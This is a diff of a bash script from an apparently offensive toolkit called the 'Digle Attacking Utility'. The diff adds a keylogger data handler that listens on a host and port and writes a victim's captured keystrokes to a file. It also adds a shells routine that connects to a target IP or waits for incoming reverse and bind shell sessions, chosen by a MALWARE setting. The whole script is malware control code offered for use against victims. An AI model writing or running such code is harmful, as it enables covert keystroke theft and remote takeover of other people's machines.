@@ -24,26 +24,29 @@ phone(){
  cd - &> /dev/null
 }
 
-if [ "$1" == '' ];then
-trap dexit SIGINT
-if   [ "$VICTIM" == '0.0.0.0' ] || [ "$VICTIM" == '' ];then
-  cerr Error Target IP is not Defined, Execute info victim
-  exit 1
-elif [ "$PORT" == '' ];then
-  cerr Error Target Port is not Defined, Execute info victim
-  exit 1
-elif [ "$LHOST" == '              ' ];then
-  cerr "Error Your LHOST Not Set, The Host We Should Listen On For Incoming Sessions, Execute show options, Execute info lset"
-  exit
-elif [ "$LPORT" == '' ];then
-  cerr "Error Your LPORT Not Set, The Port We Should Listen On For Incoming Sessions, Execute show options, Execute info lset"
-  exit
-fi
+kylog(){
+      if [ "$SAVE" == '' ];then
+        export SAVE=keylogger_output_file.txt
+        cout "Keystrokes Holder File: $GREEN$SAVE$WHITE"
+        touch $SAVE
+      fi
+
+      cout "Starting Keylogger Data Handler..."
+      sleep 1
+      cout "Listening On $LHOST:$LPORT, Waiting For Keylogger Signals... (It should take 1 min and 30 seconds maximum To Connect if Keylogger is running)"
+      echo
+      $PODGL/bin/exploit listen $LHOST $LPORT | tee $SAVE
+      if [ "$1" == 4 ];then
+        cerr "Error Listening On ${GREEN}$IP:$PORT${WHITE}, Not Avalaible, Wrong, Or Maybe Another Process is using it"
+      fi
+}
+
+shells(){
 cout Starting Attack...
 sleep 0.5
 cout This is an Automated Attack Section....
 sleep 0.3
-printf "${green}☢ Trying$white to ${red}connect${white} With ${red}$VICTIM ${white}Port$red $PORT $purple\n"
+cout "Trying$WHITE to ${RED}connect${WHITE} With ${RED}$(printf $VICTIM | sed s/' '//g) ${WHITE}Port$RED $PORT $PURPLE\n"
 sleep 0.1
 $PODGL/bin/exploit connect $VICTIM $PORT
 if [ "$?" == 2 ];then
@@ -51,15 +54,51 @@ if [ "$?" == 2 ];then
   sleep 0.4
   cerr Connection Request Rejected..!
   sleep 0.4
-  printf "${green}☢ ${cyan}Listening on port $red$PORT$cyan For Incoming Sessions.... $purple(Press CTRL+C To Stop) (It Take 1 Minute Maximum)\n"
+  cout "${CYAN}Listening on port $RED$PORT$CYAN For Incoming Sessions.... $PURPLE(Press CTRL+C To Stop) (It Take 1 Minute Maximum)\n"
 
   $PODGL/bin/exploit listen $LHOST $LPORT
   if [ "$?" == 4 ];then
      sleep 0.3
      cerr An Error Was Occured, Maybe Another Proccess is Using This Address
   fi
+  echo
   cout "Attack Finished"
 fi
+}
+
+notify "Welcome To The Digle Attacking Utility"
+
+sleep 0.5
+if [ "$VICTIM" == '0.0.0.0      ' ] || [ "$VICTIM" == '             ' ];then
+  unknown Victim IP is Not Defined
+  sleep 0.5
+  inform "The Attacking Utility Switched To The Remote Session Handler"
+  sleep 0.5
+fi
+if [ "$PORT" == '' ];then
+  cerr Target Port is not Defined
+  sleep 0.5
+fi
+if [ "$LHOST" == '              ' ];then
+  cerr "Error Your$RED LHOST$WHITE Not Set, The Host We Should Listen On For Incoming Remote Sessions"
+  exit
+fi
+
+if [ "$LPORT" == '' ];then
+  cerr "Error Your$RED LPORT$WHITE Not Set, The Port We Should Listen On For Incoming Remote Sessions"
+  exit
+fi
+sleep 0.5
+cout "Starting Up The Utility..."
+sleep 0.5
+cout "Using ${GREEN}$LHOST$WHITE For Remote Session Handler At Port ${GREEN}$LPORT"
+sleep 1
+
+if [ "$MALWARE" == "reverse_shell" ] || [ "$MALWARE" == "bind_shell" ];then
+   shells;
+elif [ "$MALWARE" == "keylogger" ];then
+   kylog;
 else
-$1 $2
+   cerr "Attack Failed To Determine What You Want, Execute show options and make sure you entered options correctly using the lset command"
+
 fi
